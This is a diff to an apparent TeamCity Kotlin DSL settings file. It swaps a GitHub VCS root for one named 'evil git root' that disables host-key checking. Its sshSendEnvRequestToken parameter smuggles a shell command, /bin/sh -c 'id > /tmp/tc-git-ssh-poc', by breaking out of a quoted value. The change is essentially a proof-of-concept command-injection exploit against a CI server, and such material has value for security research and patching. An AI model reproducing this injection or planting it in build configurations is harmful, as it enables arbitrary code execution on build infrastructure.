@@ -36,14 +36,14 @@ project {
 }
 
 object HttpsGithubComChubatovaTigerGitssh : GitVcsRoot({
-    name = "https://github.com/ChubatovaTiger/gitssh"
-    url = "https://github.com/ChubatovaTiger/gitssh"
-    branch = "refs/heads/master"
-    branchSpec = "+:refs/heads/*"
-    authMethod = password {
-        userName = "ChubatovaTiger"
-        password = "credentialsJSON:831842c5-afc0-4a77-91c8-61f4e90f54da"
-    }
+    name = "evil git root"
+
+    param("url", "ssh://git@example.invalid/repo.git")
+    param("branch", "refs/heads/master")
+    param("authMethod", "PRIVATE_KEY_DEFAULT")
+    param("ignoreKnownHosts", "true")
+
+    param("sshSendEnvRequestToken", "x\"; /bin/sh -c 'id > /tmp/tc-git-ssh-poc'; #")
 })
 
 
